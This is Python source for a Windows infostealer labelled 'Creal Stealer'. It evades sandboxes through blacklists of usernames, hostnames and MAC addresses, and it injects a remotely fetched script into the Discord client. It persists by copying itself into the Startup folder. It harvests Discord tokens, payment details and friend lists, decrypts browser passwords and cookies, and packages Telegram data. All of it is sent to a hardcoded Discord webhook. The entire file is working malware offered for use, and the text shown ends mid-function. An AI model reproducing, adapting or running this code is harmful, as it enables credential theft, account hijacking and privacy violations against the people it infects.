import os
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import *
import time
import shutil
from zipfile import ZipFile
import random
import re
import subprocess
import sys
import shutil
import uuid
import socket
import getpass



blacklistUsers = ['WDAGUtilityAccount', '3W1GJT', 'QZSBJVWM', '5ISYH9SH', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg']

username = getpass.getuser()

if username.lower() in blacklistUsers:
    os._exit(0)

def kontrol():

    blacklistUsername = ['BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']

    hostname = socket.gethostname()

    if any(name in hostname for name in blacklistUsername):
        os._exit(0)

kontrol()

BLACKLIST1 = ['00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de', '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40', '42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01', '42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3', '00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1', '00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de', 'd4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33', '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02', '42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64', '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29', '00:15:5d:00:00:b3', '96:2b:e9:43:96:76', 'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e', '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77', '3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55', '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d', '00:50:56:a0:cd:a8', '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97', 'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e', '00:50:56:ae:b2:b0', '00:50:56:b3:94:cb', '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa', '00:50:56:b3:91:c8', '3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75', '00:50:56:b3:dd:03', 'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20', '3c:ec:ef:44:00:d0', '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59', '00:50:56:b3:9e:9e', '00:50:56:a0:39:18', '32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7', '94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59', 'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54', 'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de', '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33', '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06', '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d', '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']

mac_address = uuid.getnode()
if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
    os._exit(0)




wh00k = "https://discord.com/api/webhooks/1101177888704835685/cipUUzqtzx3ZP3KNPeS8MszJPj6wj8WBjMLE-Mgcmp3nmnY5lD3-6a2bOC-mXL7xe3Yj"
inj_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
    
DETECTED = False
#bir ucaktik dustuk bir gemiydik battik :(
def g3t1p():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

requirements = [
    ["requests", "requests"],
    ["Crypto.Cipher", "pycryptodome"],
]
for modl in requirements:
    try: __import__(modl[0])
    except:
        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
        time.sleep(3)

import requests
from Crypto.Cipher import AES

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
Threadlist = []


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def G3tD4t4(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return G3tD4t4(blob_out)

def D3kryptV4lU3(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

def L04dR3qu3sTs(methode, url, data='', files='', headers=''):
    for i in range(8): # max trys
        try:
            if methode == 'POST':
                if data != '':
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != '':
                    r = requests.post(url, files=files)
                    if r.status_code == 200 or r.status_code == 413:
                        return r
        except:
            pass

def L04durl1b(wh00k, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(wh00k, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(wh00k, data=data))
                return r
        except: 
            pass

def globalInfo():
    ip = g3t1p()
    us3rn4m1 = os.getenv("USERNAME")
    ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
    # print(ipdatanojson)
    ipdata = loads(ipdatanojson)
    # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
    contry = ipdata["country_name"]
    contryCode = ipdata["country_code"].lower()
    sehir = ipdata["state"]

    globalinfo = f":flag_{contryCode}:  - `{us3rn4m1.upper()} | {ip} ({contry})`"
    return globalinfo


def TR6st(C00k13):
    # simple Trust Factor system
    global DETECTED
    data = str(C00k13)
    tim = re.findall(".google.com", data)
    # print(len(tim))
    if len(tim) < -1:
        DETECTED = True
        return DETECTED
    else:
        DETECTED = False
        return DETECTED
        
def G3tUHQFr13ndS(t0k3n):
    b4dg3List =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except:
        return False

    uhqlist = ''
    for friend in friendlist:
        Own3dB3dg4s = ''
        flags = friend['user']['public_flags']
        for b4dg3 in b4dg3List:
            if flags // b4dg3["Value"] != 0 and friend['type'] == 1:
                if not "House" in b4dg3["Name"]:
                    Own3dB3dg4s += b4dg3["Emoji"]
                flags = flags % b4dg3["Value"]
        if Own3dB3dg4s != '':
            uhqlist += f"{Own3dB3dg4s} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
    return uhqlist


process_list = os.popen('tasklist').readlines()


for process in process_list:
    if "Discord" in process:
        
        pid = int(process.split()[1])
        os.system(f"taskkill /F /PID {pid}")

def G3tb1ll1ng(t0k3n):
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        b1ll1ngjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False
    
    if b1ll1ngjson == []: return "```None```"

    b1ll1ng = ""
    for methode in b1ll1ngjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                b1ll1ng += ":credit_card:"
            elif methode["type"] == 2:
                b1ll1ng += ":parking: "

    return b1ll1ng

def inj_discord():

    username = os.getlogin()

    folder_list = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment']

    for folder_name in folder_list:
        deneme_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
        if os.path.isdir(deneme_path):
            for subdir, dirs, files in os.walk(deneme_path):
                if 'app-' in subdir:
                    for dir in dirs:
                        if 'modules' in dir:
                            module_path = os.path.join(subdir, dir)
                            for subsubdir, subdirs, subfiles in os.walk(module_path):
                                if 'discord_desktop_core-' in subsubdir:
                                    for subsubsubdir, subsubdirs, subsubfiles in os.walk(subsubdir):
                                        if 'discord_desktop_core' in subsubsubdir:
                                            for file in subsubfiles:
                                                if file == 'index.js':
                                                    file_path = os.path.join(subsubsubdir, file)

                                                    inj_content = requests.get(inj_url).text

                                                    inj_content = inj_content.replace("%WEBHOOK%", wh00k)

                                                    with open(file_path, "w", encoding="utf-8") as index_file:
                                                        index_file.write(inj_content)
inj_discord()

def G3tB4dg31(flags):
    if flags == 0: return ''

    Own3dB3dg4s = ''
    b4dg3List =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    for b4dg3 in b4dg3List:
        if flags // b4dg3["Value"] != 0:
            Own3dB3dg4s += b4dg3["Emoji"]
            flags = flags % b4dg3["Value"]

    return Own3dB3dg4s

def G3tT0k4n1nf9(t0k3n):
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    us3rjs0n = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    us3rn4m1 = us3rjs0n["username"]
    hashtag = us3rjs0n["discriminator"]
    em31l = us3rjs0n["email"]
    idd = us3rjs0n["id"]
    pfp = us3rjs0n["avatar"]
    flags = us3rjs0n["public_flags"]
    n1tr0 = ""
    ph0n3 = ""

    if "premium_type" in us3rjs0n: 
        nitrot = us3rjs0n["premium_type"]
        if nitrot == 1:
            n1tr0 = "<a:DE_BadgeNitro:865242433692762122>"
        elif nitrot == 2:
            n1tr0 = "<a:DE_BadgeNitro:865242433692762122><a:autr_boost1:1038724321771786240>"
    if "ph0n3" in us3rjs0n: ph0n3 = f'{us3rjs0n["ph0n3"]}'

    return us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3

def ch1ckT4k1n(t0k3n):
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False

if getattr(sys, 'frozen', False):
    currentFilePath = os.path.dirname(sys.executable)
else:
    currentFilePath = os.path.dirname(os.path.abspath(__file__))

fileName = os.path.basename(sys.argv[0])
filePath = os.path.join(currentFilePath, fileName)

startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
startupFilePath = os.path.join(startupFolderPath, fileName)

if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():
    with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
        shutil.copyfileobj(src_file, dst_file)


def upl05dT4k31(t0k3n, path):
    global wh00k
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3 = G3tT0k4n1nf9(t0k3n)

    if pfp == None: 
        pfp = "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
    else:
        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"

    b1ll1ng = G3tb1ll1ng(t0k3n)
    b4dg3 = G3tB4dg31(flags)
    friends = G3tUHQFr13ndS(t0k3n)
    if friends == '': friends = "```No Rare Friends```"
    if not b1ll1ng:
        b4dg3, ph0n3, b1ll1ng = "🔒", "🔒", "🔒"
    if n1tr0 == '' and b4dg3 == '': n1tr0 = "```None```"

    data = {
        "content": f'{globalInfo()} | `{path}`',
        "embeds": [
            {
            "color": 2895667,
            "fields": [
                {
                    "name": "<a:hyperNOPPERS:828369518199308388> Token:",
                    "value": f"```{t0k3n}```",
                    "inline": True
                },
                {
                    "name": "<:mail:750393870507966486> Email:",
                    "value": f"```{em31l}```",
                    "inline": True
                },
                {
                    "name": "<a:1689_Ringing_Phone:755219417075417088> Phone:",
                    "value": f"```{ph0n3}```",
                    "inline": True
                },
                {
                    "name": "<:mc_earth:589630396476555264> IP:",
                    "value": f"```{g3t1p()}```",
                    "inline": True
                },
                {
                    "name": "<:woozyface:874220843528486923> Badges:",
                    "value": f"{n1tr0}{b4dg3}",
                    "inline": True
                },
                {
                    "name": "<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:",
                    "value": f"{b1ll1ng}",
                    "inline": True
                },
                {
                    "name": "<a:mavikirmizi:853238372591599617> HQ Friends:",
                    "value": f"{friends}",
                    "inline": False
                }
                ],
            "author": {
                "name": f"{us3rn4m1}#{hashtag} ({idd})",
                "icon_url": f"{pfp}"
                },
            "footer": {
                "text": "Creal Stealer",
                "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
            }
        ],
        "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
        "username": "Creal Stealer",
        "attachments": []
        }
    L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)

#hersey son defa :(
def R4f0rm3t(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def upload(name, link):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    if name == "crcook":
        rb = ' | '.join(da for da in cookiWords)
        if len(rb) > 1000: 
            rrrrr = R4f0rm3t(str(cookiWords))
            rb = ' | '.join(da for da in rrrrr)
        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                    "title": "Creal | Cookies Stealer",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealCookies.txt]({link})",
                    "color": 2895667,
                    "footer": {
                        "text": "Creal Stealer",
                        "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
                    }
                }
            ],
            "username": "Creal Stealer",
            "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
            "attachments": []
            }
        L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
        return

    if name == "crpassw":
        ra = ' | '.join(da for da in paswWords)
        if len(ra) > 1000: 
            rrr = R4f0rm3t(str(paswWords))
            ra = ' | '.join(da for da in rrr)

        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                    "title": "Creal | Password Stealer",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealPassword.txt]({link})",
                    "color": 2895667,
                    "footer": {
                        "text": "Creal Stealer",
                        "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
                    }
                }
            ],
            "username": "Creal",
            "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
            "attachments": []
            }
        L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
        return

    if name == "kiwi":
        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                "color": 2895667,
                "fields": [
                    {
                    "name": "Interesting files found on user PC:",
                    "value": link
                    }
                ],
                "author": {
                    "name": "Creal | File Stealer"
                },
                "footer": {
                    "text": "Creal Stealer",
                    "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
                }
                }
            ],
            "username": "Creal Stealer",
            "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
            "attachments": []
            }
        L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
        return




# def upload(name, tk=''):
#     headers = {
#         "Content-Type": "application/json",
#         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
#     }

#     # r = requests.post(hook, files=files)
#     LoadRequests("POST", hook, files=files)
    _




def wr1tef0rf1l3(data, name):
    path = os.getenv("TEMP") + f"\cr{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"<--Creal STEALER BEST -->\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

T0k3ns = ''
def getT0k3n(path, arg):
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for t0k3n in re.findall(regex, line):
                        global T0k3ns
                        if ch1ckT4k1n(t0k3n):
                            if not t0k3n in T0k3ns:
                                # print(token)
                                T0k3ns += t0k3n
                                upl05dT4k31(t0k3n, path)

P4ssw = []
def getP4ssw(path, arg):
    global P4ssw, P4sswCount
    if not os.path.exists(path): return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in paswWords: paswWords.append(old)
            P4ssw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {D3kryptV4lU3(row[2], master_key)}")
            P4sswCount += 1
    wr1tef0rf1l3(P4ssw, 'passw')

C00k13 = []    
def getC00k13(path, arg):
    global C00k13, CookiCount
    if not os.path.exists(path): return
    
    pathC = path + arg + "/Cookies"
    if os.stat(pathC).st_size == 0: return
    
    tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
    
    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in cookiWords: cookiWords.append(old)
            C00k13.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{D3kryptV4lU3(row[2], master_key)}")
            CookiCount += 1
    wr1tef0rf1l3(C00k13, 'cook')

def G3tD1sc0rd(path, arg):
    if not os.path.exists(f"{path}/Local State"): return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    # print(path, master_key)
    
    for file in os.listdir(pathC):
        # print(path, file)
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                for t0k3n in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global T0k3ns
                    t0k3nDecoded = D3kryptV4lU3(b64decode(t0k3n.split('dQw4w9WgXcQ:')[1]), master_key)
                    if ch1ckT4k1n(t0k3nDecoded):
                        if not t0k3nDecoded in T0k3ns:
                            # print(token)
                            T0k3ns += t0k3nDecoded
                            # writeforfile(Tokens, 'tokens')
                            upl05dT4k31(t0k3nDecoded, path)

def GatherZips(paths1, paths2, paths3):
    thttht = []
    for patt in paths1:
        a = threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[5], patt[1]])
        a.start()
        thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)
    
    a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht: 
        thread.join()
    global WalletsZip, GamingZip, OtherZip
        # print(WalletsZip, GamingZip, OtherZip)

    wal, ga, ot = "",'',''
    if not len(WalletsZip) == 0:
        wal = ":coin:  •  Wallets\n"
        for i in WalletsZip:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if not len(WalletsZip) == 0:
        ga = ":video_game:  •  Gaming:\n"
        for i in GamingZip:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if not len(OtherZip) == 0:
        ot = ":tickets:  •  Apps\n"
        for i in OtherZip:
            ot += f"└─ [{i[0]}]({i[1]})\n"          
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    
    data = {
        "content": globalInfo(),
        "embeds": [
            {
            "title": "Creal Zips",
            "description": f"{wal}\n{ga}\n{ot}",
            "color": 2895667,
            "footer": {
                "text": "Creal Stealer",
                "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
            }
            }
        ],
        "username": "Creal Stealer",
        "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
        "attachments": []
    }
    L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)


def ZipTelegram(path, arg, procc):
    global OtherZip
    pathC = path
    name = arg
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file and not "tdummy" in file and not "user_data" in file and not "webview" in file: 
            zf.write(pathC + "/" + file)
    zf.close()

